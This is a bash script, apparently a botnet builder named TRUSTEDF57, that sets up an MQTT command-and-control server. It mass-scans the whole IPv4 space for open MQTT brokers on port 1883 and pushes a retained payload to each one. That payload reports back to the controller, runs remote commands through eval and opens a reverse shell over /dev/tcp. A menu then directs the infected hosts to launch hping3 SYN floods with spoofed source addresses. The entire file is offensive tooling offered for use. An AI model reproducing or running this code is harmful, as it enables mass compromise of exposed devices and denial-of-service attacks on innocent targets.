#!/bin/bash
# TRUSTEDF57 v3.1 - FIXED MASS SCAN
# Masscan adapters fix + robust error handling

clear
echo "🔥 TRUSTEDF57 - MQTT C2 v3.1 (FIXED)"
echo "======================================="

# Auto-detect REAL public IP
MY_IP=$(curl -s --max-time 3 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "127.0.0.1")
C2_PORT=1883
HEARTBEAT_TOPIC="/firmware/status/$MY_IP"
CMD_TOPIC="/sys/update/$MY_IP/+"

BROKERS_SCANNED=0
BROKERS_INFECTED=0
BOTS_ONLINE=0
TOTAL_ZOMBIES=0

echo "🌐 Public IP: $MY_IP"
echo ""

# Install deps (quiet)
setup_c2() {
    apt update >/dev/null 2>&1 && apt install -yq mosquitto mosquitto-clients masscan hping3 nmap >/dev/null 2>&1
    systemctl restart mosquitto 2>/dev/null || true
    echo "✅ Tools ready"
}

show_menu() {
    echo "📋 MENU:"
    echo "1) 🔍 MASS SCAN 1883 (worldwide)"
    echo "2) 🦠 INFECT ALL BROKERS" 
    echo "3) 🚀 DDoS ATTACK"
    echo "4) 📊 STATUS"
    echo "5) 🛑 EXIT"
    echo ""
}

update_stats() {
    echo "📊 STATS:"
    echo "   Brokers: $BROKERS_SCANNED | Infected: $BROKERS_INFECTED"
    echo "   Zombies: $TOTAL_ZOMBIES | Active: $BOTS_ONLINE"
    echo ""
}

log() {
    echo "[$(date +'%H:%M:%S')] $1"
}

# FIXED MASS SCAN - No adapters error
mass_scan() {
    log "🔍 MASS SCAN 1883 WORLDWIDE..."
    : > brokers.txt
    
    # Method 1: Masscan con fix (no adapters)
    timeout 120 masscan 0.0.0.0/0 -p1883 --rate=100000 -oL brokers.txt 2>/dev/null &
    SCAN_PID=$!
    
    # Fallback: NMAP top ranges se masscan fallisce
    (sleep 10 && ! kill -0 $SCAN_PID 2>/dev/null && log "⚠️ Masscan fallback → NMAP top ranges" && 
     nmap -p1883 --open -sS -T4 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 -oG - | grep 1883/open | awk '{print $2":1883"}' >> brokers.txt) &
    
    for i in {1..60}; do
        if [[ -f brokers.txt && -s brokers.txt ]]; then
            BROKERS_SCANNED=$(grep -c "1883/open" brokers.txt 2>/dev/null || echo 0)
            echo -ne "\r🔍 Scanned: $BROKERS_SCANNED brokers... ($i/60s) "
        fi
        sleep 1
    done
    
    kill $SCAN_PID 2>/dev/null || true
    wait
    
    # Cleanup + count
    grep "1883/open" brokers.txt 2>/dev/null | cut -d' ' -f4 > brokers_clean.txt && mv brokers_clean.txt brokers.txt
    BROKERS_SCANNED=$(wc -l < brokers.txt 2>/dev/null || echo 0)
    
    log "✅ SCAN OK! $BROKERS_SCANNED brokers salvati → brokers.txt"
}

infect_all() {
    [[ ! -s brokers.txt ]] && { log "❌ Prima MASS SCAN!"; return; }
    
    log "🦠 INFECTING $BROKERS_SCANNED brokers..."
    PAYLOAD=$(cat << 'EOF'
#!/bin/bash
C2="%s"
LOOP=/tmp/.f\${C2%%:*}
[[ -f \$LOOP ]] && exit
touch \$LOOP
while true; do
  mosquitto_pub -h \$C2 -p 1883 -t "/firmware/status/\${C2%%:*}/\$RANDOM" -m "alive:\$(id):\$(nproc)" 1>/dev/null 2>&1 || sleep 30
  mosquitto_sub -h \$C2 -p 1883 -t "/sys/update/\${C2%%:*}/#" -C 1 | while read topic cmd; do
    [[ \$cmd =~ ^ddos: ]] && eval "\${cmd#ddos:}" &
    [[ \$cmd =~ ^shell: ]] && bash -i >& /dev/tcp\${cmd#shell:} 0>&1 &
    [[ \$cmd == kill ]] && rm \$LOOP && exit
  done || sleep 15
done
EOF
)
    PAYLOAD=$(printf "$PAYLOAD" "$MY_IP")
    
    # Parallel infect (200 threads)
    grep . brokers.txt | nl | xargs -n1 -P200 bash -c '
    target=$1; ip=${target%:*}
    for t in "/update/firmware" "/device/config"; do
        timeout 2 mosquitto_pub -h $ip -p 1883 -t "$t" -m "'"${PAYLOAD//\"/\\\"}"'" --retain >/dev/null 2>&1
    done' _
    
    BROKERS_INFECTED=$BROKERS_SCANNED
    log "🎉 INFEZIONE COMPLETA! ($BROKERS_INFECTED) - Wait heartbeat..."
}

ddos_menu() {
    echo "🎯 TARGET:"
    read -p "IP:PORT (default 8.8.8.8:80): " TARGET
    TARGET=${TARGET:-8.8.8.8:80}
    read -p "Duration (sec): " DURATION
    DURATION=${DURATION:-120}
    
    [[ $TOTAL_ZOMBIES -lt 5 ]] && { echo "⚠️ Infect first!"; return; }
    
    CMD="ddos:hping3 --flood -S -p${TARGET#*:} -d 1400 --rand-source ${TARGET%:*} 0>/dev/null 2>&1 &"
    log "💥 DDoS → $TARGET (${DURATION}s) | $TOTAL_ZOMBIES zombies"
    
    mosquitto_pub -h localhost -p $C2_PORT -t "$CMD_TOPIC" -m "$CMD"
    
    (sleep $DURATION && mosquitto_pub -h localhost -p $C2_PORT -t "$CMD_TOPIC" -m "kill") &
}

status_report() {
    log "📊 REPORT:"
    log "   IP: $MY_IP:$C2_PORT"
    log "   Brokers.txt: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
    log "   Infected: $BROKERS_INFECTED"
    log "   Zombies: $TOTAL_ZOMBIES"
}

# Background listener
mqtt_listener() {
    mosquitto_sub -h localhost -p $C2_PORT -t "$HEARTBEAT_TOPIC/#" 2>/dev/null | while IFS=':' read -r _ status user cpu _; do
        ((BOTS_ONLINE++))
        TOTAL_ZOMBIES=$((TOTAL_ZOMBIES + 1))
    done &
}

main() {
    setup_c2
    mqtt_listener &
    
    while true; do
        clear
        echo "🔥 TRUSTEDF57 v3.1"
        show_menu
        update_stats
        read -p "► " choice
        
        case $choice in
            1) mass_scan ;;
            2) infect_all ;;
            3) ddos_menu ;;
            4) status_report ;;
            5) log "👋"; exit 0 ;;
            *) log "❌ 1-5 only!" ;;
        esac
        read -p $'\nPress ENTER...'
    done
}

main
